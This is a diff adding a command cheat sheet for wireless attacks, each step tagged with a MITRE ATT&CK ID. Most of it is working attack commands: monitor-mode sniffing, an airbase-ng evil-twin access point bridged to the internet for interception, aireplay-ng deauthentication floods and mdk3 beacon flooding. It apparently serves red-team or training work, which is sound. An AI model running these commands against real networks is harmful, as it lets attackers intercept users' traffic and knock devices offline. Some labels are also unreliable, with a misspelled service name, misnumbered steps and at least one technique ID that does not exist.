@@ -1,0 +1,48 @@
+% Airmon 
+
+# Airmon-1: Identify Wireless Interface. List Config [T1016 - System Network Configuration Discovery]
+iwconfig
+
+# Airmon-1: Enable Monitor Mode [T1016.002 - Wireless Discovery]
+sudo airmon-ng start <interface_name>
+
+# Airmon-3: Start Scan [T1040 - Network Sniffing]
+sudo airodump-ng <interface_name>
+
+# Airmon-5: Disable Monitor Mode [T1016.002 - Wireless Discovery]
+sudo airmon-ng stop <interface_name>
+
+# Airmon-6: Enable NetworkManager [T1569.002 - System Services: Service Execution]
+sudo systemctl restart NetworkManger
+
+# Kill All Processes Involved
+sudo airmon-ng check kill
+
+# Dump Wireless Access Points in Area [T1040 - Network Sniffing]
+sudo airodump-ng <interface_name> 
+
+# Create Evil Twin [T1557.004 - Adversary-in-the-Middle:Evil Twin]
+sudo airbase-ng -a <BSSID> --essid <ESSID> -c 6 <interface_name>
+
+# Create Bridge [T1599 - Network Boundary Bridging]
+sudo ip link add name <bridgename> type bridge
+
+# Bring Bridge Up [T1599 - Network Boundary Bridging]
+sudo ip link set <bridgename> up
+
+# Bring Internet Up [T1599 - Network Boundary Bridging]
+sudo ip link set eth0 master <bridgename>
+
+# Connect Bridge with Internet [T1599 - Network Boundary Bridging]
+sudo ip link set at0 master <bridgename>
+
+# Start DHClient in Background [T1016 - System Network Configuration Discovery]
+sudo dhclient <bridgename> &
+
+# Deauthentication Packets to Force Target Devices Off the Network [T1498.001 - Network Denial of Service:Direct Network Flood]
+sudo aireplay-ng --deauth 10 -a $BSSID wlan0 --ignore-negative-one
+
+# Beacon Flood with Custom Wordlist using mdk3
+mdk3 wlan0mon b -c 1 -f ./wifilist.lst
+
+$ interface_name: ip -o link show | awk -F': ' '{print $2}'
